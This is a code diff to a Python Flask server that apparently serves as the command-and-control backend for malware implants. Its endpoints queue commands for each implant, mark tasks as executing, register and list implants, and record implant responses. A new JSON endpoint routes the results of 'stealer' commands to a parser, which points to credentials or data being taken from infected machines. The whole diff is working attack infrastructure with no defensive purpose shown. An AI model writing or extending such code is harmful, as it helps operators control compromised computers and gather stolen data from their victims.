@@ -139,22 +139,22 @@ def get_qcommands():
         print(error)
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
-# List all commands for a particular implant
+# List all commands for a particular implant, in json 
 @app.route("/get_commands", methods=["POST"])
 def get_commands():
     data = request.json
     id = data['id']
-    # if [";", "\'", "\""] in id:
-    #     return "What", 401, {'Access-Control-Allow-Origin': config.clientURL}
     try:
-        query = sql.SQL("select * from {table} where {column} = %s").format(
+        query = sql.SQL("UPDATE {table} SET status = 'executing' WHERE status = 'untouched' AND {column} = %s RETURNING *").format(
             table=sql.Identifier('task_queue'),
             column=sql.Identifier('target_implant_id'))
+
         db_resp = tools.executeSelectQueryVars(query, [id])
+
         print(f"this is the db response: {db_resp}")
         if db_resp == None:
             db_resp = {"commands": "No commands found"}
-
+        
         response = db_resp
         return response, {'Access-Control-Allow-Origin': config.clientURL}
 
@@ -164,8 +164,6 @@ def get_commands():
         return error, {'Access-Control-Allow-Origin': config.clientURL}
 
 # List untouched commands for a particular implant don't yell at me this was just the easiest to do instead of refactor client
-
-
 @app.route("/get_untouched", methods=["POST"])
 def get_untouched():
     data = request.json
@@ -235,8 +233,6 @@ def register_implant():
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
 # Display implants
-
-
 @app.route("/display_implants", methods=["GET"])
 def display_implants():
     try:
@@ -247,11 +243,46 @@ def display_implants():
         print(f"Error displaying implants: {e}")
         return e, {'Access-Control-Allow-Origin': config.clientURL}
 
+#Implant response endpoint, in json
+@app.route("/response_json", methods=["POST"])
+@cross_origin()
+def handle_response_json():
+    print("Recieved response")
+    try:
+        data = request.get_json(force=True)
+        print()
+        print("response:")
+        target_implant_id = data['target_implant_id']
+        task_id = data['task_id']
+        response_data = data['response_data']
+        success = data['success']
+        command = data['command']
+
+        print("checking command: " + command)
+        if "stealer" in command:
+            # TODO call Wyatt's function
+            response_data = WyattWonderland.parsejson(response_data)
+
+        print("Querying now")
+        # DUMP BACK INTO TASK_QUEUE
+        query = "UPDATE task_queue SET status = 'executed', response_data = %s, success = %s, recieved_on = %s WHERE task_id= %s"
+
+        print("succesful")
+        time = datetime.now()
+        tools.executeGenericVar(query, [response_data, success, time, task_id])
+
+        return "success", 200, {'Access-Control-Allow-Origin': config.clientURL}
+
+    except Exception as error:
+        print()
+        print()
+        print(error)
+        print()
+        return "failure", 409, {'Access-Control-Allow-Origin': config.clientURL}
 
 @app.route("/response", methods=["POST"])
 @cross_origin()
 def handle_response():
-
     print("Recieved response")
     try:
         request.get_data()
